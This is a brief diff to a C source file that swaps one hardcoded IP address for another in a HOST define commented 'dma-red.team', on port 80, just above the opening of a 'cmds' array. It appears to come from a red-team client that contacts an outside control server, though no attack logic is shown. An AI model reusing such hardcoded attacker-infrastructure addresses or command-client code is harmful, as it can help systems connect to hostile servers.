@@ -9,7 +9,7 @@
 #include <stdlib.h>
 #include <stdbool.h>
 
-#define HOST "40.79.72.115"  /* dma-red.team */
+#define HOST "142.93.195.236"  /* dma-red.team */
 #define PORT 80
 
 char *cmds[] = {
